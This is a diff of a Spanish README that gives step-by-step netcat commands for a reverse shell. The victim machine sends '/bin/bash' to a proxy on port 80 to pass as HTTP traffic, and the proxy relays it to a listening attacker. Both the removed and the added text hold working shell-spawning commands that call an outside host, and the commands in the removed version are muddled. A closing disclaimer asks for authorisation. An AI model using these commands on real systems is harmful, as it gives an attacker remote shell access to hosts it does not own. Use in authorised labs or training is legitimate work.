@@ -1,26 +1,37 @@
-# README - Configuración de Reverse Shell a través de Proxy
-Este README proporciona instrucciones sobre cómo configurar una reverse shell desde una máquina atacante a través de un proxy hacia una máquina final.
+# README - Conexión de Shell Inversa a través de Proxy
+Este README proporciona una descripción general de la configuración necesaria para establecer una conexión de shell inversa desde una máquina víctima a través de un proxy hacia una máquina atacante.
 
-# Configuración Máquinas involucradas:
-  - Máquina atacante: (IP atacante)
-  - Proxy: (IP proxy)
-  - Máquina final: (IP víctima)
+# Descripción del Escenario
+En este escenario, hemos configurado una conexión de shell inversa a través de un proxy utilizando netcat (nc). La configuración implica tres máquinas:
 
-# Pasos para la configuración:
-1. Máquina atacante (IP atacante):
+- Máquina Atacante (Attacker): La máquina desde la que se inicia la conexión de shell inversa.
+- Proxy: El intermediario que redirige el tráfico entre la máquina víctima y la máquina atacante.
+- Máquina Víctima (Victim): La máquina que envía la conexión de shell inversa a través del proxy.
 
-2. Ejecuta el siguiente comando para establecer una conexión a través del proxy y enviar la shell inversa:
-- nc -e /bin/bash (IP proxy) 443 | nc -v (IP víctima) 443 Proxy ((IP proxy)):
+# Configuración
 
-# Ejecuta el siguiente comando para escuchar en el puerto 443 y redirigir el tráfico entrante a la máquina final:
+Máquina Atacante (Attacker)
+Ejecutar el siguiente comando para escuchar la conexión entrante:
 
-- nc -lvp 443 | nc -v (IP víctima) 443 Máquina final ((IP víctima)):
+bash
+Copy code
+nc -lvp 443
 
-# Configura un listener para recibir la conexión entrante en el puerto 443:
+# Proxy
+Ejecutar el siguiente comando para redirigir el tráfico entrante al puerto 443 de la máquina atacante:
 
-- nc -lvp 443  -e /bin/bash
+bash
+Copy code
+nc -lvp 443 | nc [IP de la máquina atacante] 443
 
-# Notas importantes:
+# Máquina Víctima (Victim)
+Ejecutar el siguiente comando para enviar una shell inversa al proxy en el puerto 80 (simulando una conexión HTTP):
 
-Asegúrate de tener permisos adecuados y contar con el consentimiento del propietario del sistema antes de realizar este tipo de acciones.
-La seguridad ética y responsable es esencial en todas las actividades relacionadas con la seguridad informática.
+bash
+Copy code
+nc -e /bin/bash [IP del proxy] 80
+
+# Consideraciones Importantes
+Asegúrate de tener los permisos adecuados y el consentimiento del propietario del sistema antes de realizar estas acciones.
+Las direcciones IP y los puertos mencionados en este README son ejemplos y deben reemplazarse por las direcciones IP y puertos reales de tu configuración.
+Es fundamental respetar las leyes y regulaciones locales relacionadas con la seguridad informática y la privacidad.
